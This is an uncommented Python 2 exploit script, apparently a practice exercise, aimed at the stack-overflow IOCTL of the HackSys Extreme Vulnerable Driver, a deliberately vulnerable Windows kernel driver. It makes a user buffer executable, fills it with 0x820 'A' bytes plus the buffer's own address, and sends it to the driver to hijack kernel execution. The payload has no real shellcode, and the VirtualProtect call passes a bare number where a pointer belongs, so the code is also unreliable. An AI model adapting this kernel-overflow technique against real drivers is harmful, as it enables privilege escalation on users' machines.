import win32api
import win32file
import winioctlcon
import struct
import ctypes

IOCTL_STACK=0x222003

hDevice = win32file.CreateFile(r"\\.\HackSysExtremeVulnerableDriver",win32file.GENERIC_READ | win32file.GENERIC_WRITE, 0, None,win32file.OPEN_EXISTING, win32file.FILE_ATTRIBUTE_NORMAL, 0)

print int(hDevice)

buf=win32file.AllocateReadBuffer(0x824)
a=buf.__repr__()
a=a[a.find("0x"):a.find(",")]
a=(int(a,16))

print "address = %x"%a


ctypes.windll.kernel32.VirtualProtect(a,0x824,0x40,0x10000)


h=win32file.CreateFile(r"pepe.bin",win32file.GENERIC_READ | win32file.GENERIC_WRITE, 0, None,win32file.CREATE_ALWAYS, win32file.FILE_ATTRIBUTE_NORMAL, 0)

data= (0x820 * "A") + struct.pack("<L",a)
win32file.WriteFile(h,data,None)
win32file.SetFilePointer(h,0,0)

win32file.ReadFile(h,buf,None)

win32file.DeviceIoControl(hDevice,IOCTL_STACK, buf, None, None)



win32file.CloseHandle(hDevice)
